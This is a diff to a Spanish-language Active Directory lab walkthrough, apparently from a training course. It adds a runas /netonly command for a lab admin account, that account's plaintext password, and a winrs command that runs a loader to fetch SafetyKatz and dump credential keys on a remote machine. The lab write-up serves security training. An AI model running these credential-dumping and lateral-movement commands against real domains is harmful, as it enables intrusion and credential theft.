@@ -584,6 +584,12 @@ Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcor
 Obteniendo la credencial del usuario srvadmin en texto plano
 Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador siendo el usuario studen97
 
+```shell
+runas /user:dcorp\srvadmin /netonly cmd
+```
+
+*TheKeyUs3ron@anyMachine!*
+
 
 Una vez dentro ejecutaremos una invishell
 ```shell
@@ -603,6 +609,12 @@ Teniendo acceso de administrador local en esa maquina de dcorp-mgmt y sabemos qu
 ```shell
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
+
+Extraeremos las credenciales
+```shell
+winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
+```
+
 
 Haremos el renvió de puertos
 ```shell
